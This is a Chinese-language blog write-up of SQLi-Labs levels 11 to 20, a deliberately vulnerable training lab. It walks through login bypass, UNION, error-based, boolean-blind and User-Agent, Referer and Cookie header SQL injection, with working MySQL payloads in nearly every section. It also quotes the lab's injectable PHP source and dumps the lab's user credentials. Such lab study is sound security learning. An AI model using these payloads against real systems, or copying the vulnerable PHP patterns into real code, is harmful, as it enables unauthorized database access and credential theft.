---
title: "SQLi-Labs 通关笔记（二）：Less-11 ~ Less-20"
date: 2026-08-19 00:00:00 +0800
categories: [SQL注入, 漏洞复现]
tags: [sqli-labs, SQL注入, MySQL, 报错注入, 盲注]
---

本篇汇总 SQLi-Labs 第 11~20 关，覆盖 POST 注入、报错注入、布尔/时间盲注与 HTTP 头注入。

## Less-11

第十一关如下，是一个POST类型的关卡
![pasted image 20260815230951](/assets/img/posts/2026-08-19-sqli-labs-less-11-20/pasted-image-20260815230951.png)

我们打开burp进行抓包，请求如下
![pasted image 20260815231555](/assets/img/posts/2026-08-19-sqli-labs-less-11-20/pasted-image-20260815231555.png)

我们可以直接将密码注释掉，直接通过账号登录
经过简单尝试也是登录成功了
payload：uname=admin'--+&passwd=1&submit=Submit
![pasted image 20260815232103](/assets/img/posts/2026-08-19-sqli-labs-less-11-20/pasted-image-20260815232103.png)

不知道账号的时候，我们也能使用万能payload，也能成功登录
payload：uname='or 1=1--+&passwd=1&submit=Submit
![pasted image 20260815232349](/assets/img/posts/2026-08-19-sqli-labs-less-11-20/pasted-image-20260815232349.png)

上方就实现登录了，下面我们可以继续获取数据库相关信息
构造payload：uname='union select version(),database()--+#&passwd=&submit=Submits
数据库版本为5.7.26，当前数据库名称为security
![pasted image 20260816001703](/assets/img/posts/2026-08-19-sqli-labs-less-11-20/pasted-image-20260816001703.png)

查表名
payload：uname=-1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()--+&passwd=&submit=Submit
![pasted image 20260816002005](/assets/img/posts/2026-08-19-sqli-labs-less-11-20/pasted-image-20260816002005.png)

查字段
payload：uname=-1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' and table_schema=database()--+&passwd=&submit=Submit
字段：id,username,password
![pasted image 20260816002256](/assets/img/posts/2026-08-19-sqli-labs-less-11-20/pasted-image-20260816002256.png)

看一下username和password
payload：uname=-1' union select 1,group_concat(0x5c,username,0x5c,password) from users--+&passwd=&submit=Submit
![pasted image 20260816002650](/assets/img/posts/2026-08-19-sqli-labs-less-11-20/pasted-image-20260816002650.png)

## Less-12

这一关只是与上一关的闭合方式不同
payload如下
uname=admin")--+&passwd=&submit=Submit
![pasted image 20260815232743](/assets/img/posts/2026-08-19-sqli-labs-less-11-20/pasted-image-20260815232743.png)

万能payload：uname=") or 1=1 --+&passwd=&submit=Submit
![pasted image 20260815232858](/assets/img/posts/2026-08-19-sqli-labs-less-11-20/pasted-image-20260815232858.png)

这一关查数据库内容的方法与上一关完全一致，payload中只是把 ' 改成了 “）

## Less-13

构造payload
uname=admin'#&passwd=&submit=Submit
发现出现报错，并且从报错信息里面推断类型为('')类型
![pasted image 20260816115611](/assets/img/posts/2026-08-19-sqli-labs-less-11-20/pasted-image-20260816115611.png)



接下来我们进行报错注入
payload：uname=admin')and extractvalue(1, concat(0x7e, database()))--+&passwd=&submit=Submit
![pasted image 20260816120002](/assets/img/posts/2026-08-19-sqli-labs-less-11-20/pasted-image-20260816120002.png)

接下来爆表，payload如下：
uname=admin')and extractvalue(1,CONCAT(0x7e, SUBSTR((select group_concat(table_name) from information_schema.tables where table_schema=database()), 1, 30)))--+&passwd=&submit=Submit
发现有emails,referers,uagents,users四张表
![pasted image 20260816120201](/assets/img/posts/2026-08-19-sqli-labs-less-11-20/pasted-image-20260816120201.png)

查看一下users表有哪些字段
构造payload:uname=admin')and extractvalue(1,CONCAT(0x7e, SUBSTR((select group_concat(column_name)from information_schema.columns where table_name='users' and table_schema=database()), 1, 30)))--+&passwd=&submit=Submit
发现只有id,username,password三个字段
![pasted image 20260816120415](/assets/img/posts/2026-08-19-sqli-labs-less-11-20/pasted-image-20260816120415.png)

接下来获取一些具体存的什么
payload:uname=admin')and extractvalue(1,CONCAT(0x7e, SUBSTR((select group_concat(0x7e,username,0x7e,password) from users), 1, 30)))--+&passwd=&submit=Submit
与上方的方法相同，使用SUBSTR 分段进行绕过，每次更改,30之前的数字1为其他数（数字1的位置是SUBSTR函数要截取字符串的起始下标（MySQL 下标从 1 开始，不是 0！）），来获取完整的数据，结果如下

```
~~Dumb~Dumb,~Angelina~I-kill
you,~Dummy~p@ssword,~secure~crappy,~stupid~stupidity,~superman~genious,~batman~mob
!le,~admin~admin,~admin1~admin1,~admin2~admin2,~admin3~admin3,~dhakkan~dumbo,~admin4~admin4
```

![pasted image 20260816120539](/assets/img/posts/2026-08-19-sqli-labs-less-11-20/pasted-image-20260816120539.png)

## Less-14



这一关与上一关一样，使用报错注入，闭合方式是把第十三关的 ') 改成 "

payload如下，我就不一一贴图了
查数据库名称
uname=admin"and extractvalue(1, concat(0x7e, database()))--+&passwd=&submit=Submit

查表名
uname=admin"and extractvalue(1,CONCAT(0x7e, SUBSTR((select group_concat(table_name) from information_schema.tables where table_schema=database()), 1, 30)))--+&passwd=&submit=Submit

查看一下users表有哪些字段
uname=admin"and extractvalue(1,CONCAT(0x7e, SUBSTR((select group_concat(column_name)from information_schema.columns where table_name='users' and table_schema=database()), 1, 30)))--+&passwd=&submit=Submit
发现只有id,username,password三个字段

获取一些具体存的内容
uname=admin"and extractvalue(1,CONCAT(0x7e, SUBSTR((select group_concat(0x7e,username,0x7e,password) from users), 1, 30)))--+&passwd=&submit=Submit

## Less-15

首先尝试闭合，当使用 ' 时，显示成功
payload：uname=admin'--+&passwd=&submit=Submit
但是这次错误时，不显示错误提示了,只显示登录成功和失败，看来只能盲注了

在burp中使用二分法进行猜数据库名称场长度，或者直接使用攻击模块进行爆破，结果如下图，数据库名称场长度为8
payload:uname=admin'AND LENGTH(database())=8--+&passwd=&submit=Submit
![pasted image 20260816122345](/assets/img/posts/2026-08-19-sqli-labs-less-11-20/pasted-image-20260816122345.png)

猜数据库名称首字母的payload如下，这一步同样也可以爆破
payload:uname=admin'and ascii(substr(database(),1,1))>100--+&passwd=&submit=Submit

猜测第一个表名的长度
payload:uname=admin' AND LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1))=6--+&passwd=&submit=Submit

## Less-16

经过几次测试,发现是`("")`类型
![pasted image 20260816123020](/assets/img/posts/2026-08-19-sqli-labs-less-11-20/pasted-image-20260816123020.png)

这一关同样是布尔盲注,与Less-15相同,就不一一列举了

## Less-17

地十七关，提示password reset，密码重置？
![pasted image 20260816130154](/assets/img/posts/2026-08-19-sqli-labs-less-11-20/pasted-image-20260816130154.png)

看来这一关是使用的SQL中的update语句
在新密码那一栏进行构造，发现是会出现报错信息的
![pasted image 20260816131741](/assets/img/posts/2026-08-19-sqli-labs-less-11-20/pasted-image-20260816131741.png)

uname=admin&passwd=' or updatexml(1,CONCAT(0x7e, SUBSTR((select group_concat(table_name)from information_schema.columns where table_schema=database()), 1, 30)),2)--+&submit=Submit
![pasted image 20260817152530](/assets/img/posts/2026-08-19-sqli-labs-less-11-20/pasted-image-20260817152530.png)

所以我们可以进行报错注入，这么这次使用一下updatexml吧，之前一直用的extractvalue
构造payload
uname=admin&passwd=' or updatexml(1,CONCAT(0x7e, SUBSTR((select group_concat(column_name)from information_schema.columns where table_name='users' and table_schema=database()), 1, 30)),2)--+&submit=Submit
![pasted image 20260817151911](/assets/img/posts/2026-08-19-sqli-labs-less-11-20/pasted-image-20260817151911.png)

## Less-18

第十八关，提示我的ip地址是127.0.0.1?啥情况，实在不懂
![pasted image 20260816215438](/assets/img/posts/2026-08-19-sqli-labs-less-11-20/pasted-image-20260816215438.png)

我们把源码拖出来看一看

```php
<?php
//including the Mysql connect parameters.
include("../sql-connections/sql-connect.php");
error_reporting(0);
	
function check_input($value)
	{
	if(!empty($value))
		{
		// truncation (see comments)
		$value = substr($value,0,20);
		}

		// Stripslashes if magic quotes enabled
		if (get_magic_quotes_gpc())
			{
			$value = stripslashes($value);
			}

		// Quote if not a number
		if (!ctype_digit($value))
			{
			$value = "'" . mysql_real_escape_string($value) . "'";
			}
		
	else
		{
		$value = intval($value);
		}
	return $value;
	}



	$uagent = $_SERVER['HTTP_USER_AGENT'];
	$IP = $_SERVER['REMOTE_ADDR'];
	echo "<br>";
	echo 'Your IP ADDRESS is: ' .$IP;
	echo "<br>";
	//echo 'Your User Agent is: ' .$uagent;
// take the variables
if(isset($_POST['uname']) && isset($_POST['passwd']))

	{
	$uname = check_input($_POST['uname']);
	$passwd = check_input($_POST['passwd']);
	
	/*
	echo 'Your Your User name:'. $uname;
	echo "<br>";
	echo 'Your Password:'. $passwd;
	echo "<br>";
	echo 'Your User Agent String:'. $uagent;
	echo "<br>";
	echo 'Your User Agent String:'. $IP;
	*/

	//logging the connection parameters to a file for analysis.	
	$fp=fopen('result.txt','a');
	fwrite($fp,'User Agent:'.$uname."\n");
	
	fclose($fp);
	
	
	
	$sql="SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1";
	$result1 = mysql_query($sql);
	$row1 = mysql_fetch_array($result1);
		if($row1)
			{
			echo '<font color= "#FFFF00" font size = 3 >';
			$insert="INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)";
			mysql_query($insert);
			//echo 'Your IP ADDRESS is: ' .$IP;
			echo "</font>";
			//echo "<br>";
			echo '<font color= "#0000ff" font size = 3 >';			
			echo 'Your User Agent is: ' .$uagent;
			echo "</font>";
			echo "<br>";
			print_r(mysql_error());			
			echo "<br><br>";
			echo '<img src="../images/flag.jpg"  />';
			echo "<br>";
			
			}
		else
			{
			echo '<font color= "#0000ff" font size="3">';
			//echo "Try again looser";
			print_r(mysql_error());
			echo "</br>";			
			echo "</br>";
			echo '<img src="../images/slap.jpg"   />';	
			echo "</font>";  
			}

	}

?>
```

这一句是关键
把php变量`$uagent`的值当作字符串存入 uagent 字段了，这个变量一般取浏览器 User‑Agent 请求头，用户是可控的。使用我们可以在User‑Agent中进行注入

```php
$insert="INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)";
```

payload： ' AND updatexml(1,CONCAT(0x7e,database()),1) AND '1'='1
![pasted image 20260816221745](/assets/img/posts/2026-08-19-sqli-labs-less-11-20/pasted-image-20260816221745.png)

果然可以，接下来我们爆表
 User-Agent:' and updatexml(1,concat(0x7e, substr((select group_concat(table_name) from information_schema.tables where table_schema=database() limit 0,1), 1, 30)),1) and '1'='1
 上面这个payload是成功不了的，后面查资料了解到**在布尔运算表达式里面调用函数，函数参数里的子查询会被限制**，但是当函数直接作为列的值，函数参数内子查询**允许执行**，所以下面的payload是可以成功执行的
User-Agent:1',1,updatexml(1,concat(0x7e, substr((select group_concat(table_name) from information_schema.tables where table_schema=database() limit 0,1), 1, 30)),1))#
还是有emails,referers,uagents,users四张表
![pasted image 20260816230132](/assets/img/posts/2026-08-19-sqli-labs-less-11-20/pasted-image-20260816230132.png)

接下来我们爆字段，payload如下
User-Agent:1',1,updatexml(1,CONCAT(0x7e, SUBSTR((select group_concat(column_name)from information_schema.columns where table_name='users' and table_schema=database()), 1, 30)),1))#
还是id,username,password这三个字段
![pasted image 20260816230516](/assets/img/posts/2026-08-19-sqli-labs-less-11-20/pasted-image-20260816230516.png)

User-Agent:1',1,updatexml(1,CONCAT(0x7e, SUBSTR((select group_concat(0x7e,username,0x7e,password) from users), 1, 30)),1))#
![pasted image 20260816230741](/assets/img/posts/2026-08-19-sqli-labs-less-11-20/pasted-image-20260816230741.png)

老办法，改SUBSTR函数的起始下标，获取完整内容

```
~~Dumb~Dumb,~Angelina~I-kill
you,~Dummy~p@ssword,~secure~crappy,~stupid~stupidity,~superman~genious,~batman~mob
!le,~admin~admin,~admin1~admin1,~admin2~admin2,~admin3~admin3,~dhakkan~dumbo,~admin4~admin4
```

## Less-19

第19关，这一关提示与上一关差不多，可能也是HTTP头注入，我们试一试
![pasted image 20260816231007](/assets/img/posts/2026-08-19-sqli-labs-less-11-20/pasted-image-20260816231007.png)

果然，注入点在Referer
payload： ' AND updatexml(1,CONCAT(0x7e,database()),1) AND '1'='1
![pasted image 20260816231257](/assets/img/posts/2026-08-19-sqli-labs-less-11-20/pasted-image-20260816231257.png)

我们继续爆表，payload如下
1',1,updatexml(1,concat(0x7e, substr((select group_concat(table_name) from information_schema.tables where table_schema=database() limit 0,1), 1, 30)),1))#
这里提示Column count doesn't match value count at row 1，就是说第 1 行，列的数量 和 值的数量不匹配
![pasted image 20260816231516](/assets/img/posts/2026-08-19-sqli-labs-less-11-20/pasted-image-20260816231516.png)

我猜可以列数是两行，先试试
果然如此，还是查到emails,referers,uagents,users四张表
![pasted image 20260816231729](/assets/img/posts/2026-08-19-sqli-labs-less-11-20/pasted-image-20260816231729.png)

爆字段和具体的值与第18关几乎一样，就是删了一个 ,1 让列的数量 和 值的数量匹配
payload我就不贴了，可以看看第18关

## Less-20

第20关，登录之后显示如下内容
让我使用cookie？但是数据包中的HTTP头没有这个字段啊，让我构造一个试试
![pasted image 20260816232326](/assets/img/posts/2026-08-19-sqli-labs-less-11-20/pasted-image-20260816232326.png)

构造半天cookie也不行啊，绷不住了
![pasted image 20260817002508](/assets/img/posts/2026-08-19-sqli-labs-less-11-20/pasted-image-20260817002508.png)

看源码吧

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />

<title>Less-20 Cookie Injection- Error Based- string</title>
</head>

<body bgcolor="#000000">
<?php
//including the Mysql connect parameters.
	include("../sql-connections/sql-connect.php");
	error_reporting(0);
if(!isset($_COOKIE['uname']))
	{
	//including the Mysql connect parameters.
	include("../sql-connections/sql-connect.php");

	echo "<div style=' margin-top:20px;color:#FFF; font-size:24px; text-align:center'> Welcome&nbsp;&nbsp;&nbsp;<font color='#FF0000'> Dhakkan </font><br></div>";
	echo "<div  align='center' style='margin:20px 0px 0px 510px;border:20px; background-color:#0CF; text-align:center;width:400px; height:150px;'>";
	echo "<div style='padding-top:10px; font-size:15px;'>";
 

	echo "<!--Form to post the contents -->";
	echo '<form action=" " name="form1" method="post">';

	echo ' <div style="margin-top:15px; height:30px;">Username : &nbsp;&nbsp;&nbsp;';
	echo '   <input type="text"  name="uname" value=""/>  </div>';
  
	echo ' <div> Password : &nbsp; &nbsp; &nbsp;';
	echo '   <input type="text" name="passwd" value=""/></div></br>';	
	echo '   <div style=" margin-top:9px;margin-left:90px;"><input type="submit" name="submit" value="Submit" /></div>';

	echo '</form>';
	echo '</div>';
	echo '</div>';
	echo '<div style=" margin-top:10px;color:#FFF; font-size:23px; text-align:center">';
	echo '<font size="3" color="#FFFF00">';
	echo '<center><br><br><br>';
	echo '<img src="../images/Less-20.jpg" />';
	echo '</center>';




	
function check_input($value)
	{
	if(!empty($value))
		{
		$value = substr($value,0,20); // truncation (see comments)
		}
		if (get_magic_quotes_gpc())  // Stripslashes if magic quotes enabled
			{
			$value = stripslashes($value);
			}
		if (!ctype_digit($value))   	// Quote if not a number
			{
			$value = "'" . mysql_real_escape_string($value) . "'";
			}
	else
		{
		$value = intval($value);
		}
	return $value;
	}


	
	echo "<br>";
	echo "<br>";
	
	if(isset($_POST['uname']) && isset($_POST['passwd']))
		{
	
		$uname = check_input($_POST['uname']);
		$passwd = check_input($_POST['passwd']);
		
	

		
		$sql="SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1";
		$result1 = mysql_query($sql);
		$row1 = mysql_fetch_array($result1);
		$cookee = $row1['username'];
			if($row1)
				{
				echo '<font color= "#FFFF00" font size = 3 >';
				setcookie('uname', $cookee, time()+3600);	
				header ('Location: index.php');
				echo "I LOVE YOU COOKIES";
				echo "</font>";
				echo '<font color= "#0000ff" font size = 3 >';			
				//echo 'Your Cookie is: ' .$cookee;
				echo "</font>";
				echo "<br>";
				print_r(mysql_error());			
				echo "<br><br>";
				echo '<img src="../images/flag.jpg" />';
				echo "<br>";
				}
			else
				{
				echo '<font color= "#0000ff" font size="3">';
				//echo "Try again looser";
				print_r(mysql_error());
				echo "</br>";			
				echo "</br>";
				echo '<img src="../images/slap.jpg" />';	
				echo "</font>";  
				}
			}
		
			echo "</font>";  
	echo '</font>';
	echo '</div>';

}
else
{



	if(!isset($_POST['submit']))
		{
			
			$cookee = $_COOKIE['uname'];
			$format = 'D d M Y - H:i:s';
			$timestamp = time() + 3600;
			echo "<center>";
			echo '<br><br><br>';
			echo '<img src="../images/Less-20.jpg" />';
			echo "<br><br><b>";
			echo '<br><font color= "red" font size="4">';	
			echo "YOUR USER AGENT IS : ".$_SERVER['HTTP_USER_AGENT'];
			echo "</font><br>";	
			echo '<font color= "cyan" font size="4">';	
			echo "YOUR IP ADDRESS IS : ".$_SERVER['REMOTE_ADDR'];			
			echo "</font><br>";			
			echo '<font color= "#FFFF00" font size = 4 >';
			echo "DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE <br>";
			echo '<font color= "orange" font size = 5 >';			
			echo "YOUR COOKIE : uname = $cookee and expires: " . date($format, $timestamp);
			
			
			echo "<br></font>";
			$sql="SELECT * FROM users WHERE username='$cookee' LIMIT 0,1";
			$result=mysql_query($sql);
			if (!$result)
  				{
  				die('Issue with your mysql: ' . mysql_error());
  				}
			$row = mysql_fetch_array($result);
			if($row)
				{
			  	echo '<font color= "pink" font size="5">';	
			  	echo 'Your Login name:'. $row['username'];
			  	echo "<br>";
				echo '<font color= "grey" font size="5">';  	
				echo 'Your Password:' .$row['password'];
			  	echo "</font></b>";
				echo "<br>";
				echo 'Your ID:' .$row['id'];
			  	}
			else	
				{
				echo "<center>";
				echo '<br><br><br>';
				echo '<img src="../images/slap1.jpg" />';
				echo "<br><br><b>";
				//echo '<img src="../images/Less-20.jpg" />';
				}
			echo '<center>';
			echo '<form action="" method="post">';
			echo '<input  type="submit" name="submit" value="Delete Your Cookie!" />';
			echo '</form>';
			echo '</center>';
		}	
	else
		{
		echo '<center>';
		echo "<br>";
		echo "<br>";
		echo "<br>";
		echo "<br>";
		echo "<br>";
		echo "<br>";
		echo '<font color= "#FFFF00" font size = 6 >';
		echo " Your Cookie is deleted";
				setcookie('uname', $row1['username'], time()-3600);
				header ('Location: index.php');
		echo '</font></center></br>';
		
		}		


			echo "<br>";
			echo "<br>";
			//header ('Location: main.php');
			echo "<br>";
			echo "<br>";
			
			//echo '<img src="../images/slap.jpg" /></center>';
			//logging the connection parameters to a file for analysis.	
		$fp=fopen('result.txt','a');
		fwrite($fp,'Cookie:'.$cookee."\n");
	
		fclose($fp);
	
}
?>

</body>
</html>

```

源码中有这几行，大概意思就是：
请求里没有submit参数，会读取Cookie uname，执行 SELECT * FROM users WHERE username='$cookee'
请求里有 submit 参数，进入else分支 // 删除Cookie，跳转页面，不会执行那条可注入的SELECT SQL

```php
	if(!isset($_POST['submit']))
		{
			
			$cookee = $_COOKIE['uname'];
			...		
			echo "YOUR COOKIE : uname = $cookee and expires: " . date($format, $timestamp);
			...
			$sql="SELECT * FROM users WHERE username='$cookee' LIMIT 0,1";
			...
		}	
	else
		{
		...
		echo " Your Cookie is deleted";
				setcookie('uname', $row1['username'], time()-3600);
				header ('Location: index.php');
		...
		
		}
```

有够阴的，我们重新构造一下数据包，删除&submit=Submit就行了
或者另一个方法，发送GET形数据包
![pasted image 20260817003431](/assets/img/posts/2026-08-19-sqli-labs-less-11-20/pasted-image-20260817003431.png)
![pasted image 20260817004246](/assets/img/posts/2026-08-19-sqli-labs-less-11-20/pasted-image-20260817004246.png)

爆表，payload如下：
Cookie: uname='and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()), 1, 30)),1)--+
![pasted image 20260817092853](/assets/img/posts/2026-08-19-sqli-labs-less-11-20/pasted-image-20260817092853.png)

爆字段，payload如下
Cookie: uname='and updatexml(1,CONCAT(0x7e, SUBSTR((select group_concat(column_name)from information_schema.columns where table_name='users' and table_schema=database()), 1, 30)),1)--+
![pasted image 20260817093058](/assets/img/posts/2026-08-19-sqli-labs-less-11-20/pasted-image-20260817093058.png)

Cookie: uname='and updatexml(1,CONCAT(0x7e, SUBSTR((select group_concat(0x7e,username,0x7e,password) from users), 1, 30)),1)--+
![pasted image 20260817093152](/assets/img/posts/2026-08-19-sqli-labs-less-11-20/pasted-image-20260817093152.png)

改下标获取完整内容，如下

```
~~Dumb~Dumb,~Angelina~I-kill
you,~Dummy~p@ssword,~secure~crappy,~stupid~stupidity,~superman~genious,~batman~mob
!le,~admin~admin,~admin1~admin1,~admin2~admin2,~admin3~admin3,~dhakkan~dumbo,~admin4~admin4
```
